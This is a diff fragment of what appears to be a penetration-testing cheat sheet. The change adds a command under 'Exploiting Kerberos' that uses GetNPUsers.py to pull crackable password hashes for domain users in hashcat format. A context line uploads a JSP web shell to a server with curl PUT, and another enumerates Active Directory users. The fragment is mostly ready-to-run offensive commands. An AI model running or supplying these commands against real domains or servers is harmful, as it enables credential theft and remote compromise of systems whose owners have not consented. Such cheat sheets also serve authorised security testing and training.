@@ -330,6 +330,9 @@ curl -X PUT https://example/path/where/to/put/shell.jsp/ -d @- < shell.jsp
 
 ### [Exploiting Kerberos]
 ```
+Retrieve hashes for users
+GetNPUsers.py <DOMAIN>/ -usersfile user.list -format hashcat -output hashes.txt
+
 Retrieving information from kerberos
 GetADUsers.py -all <domain>/<username> -dc-ip <ipaddr>
 
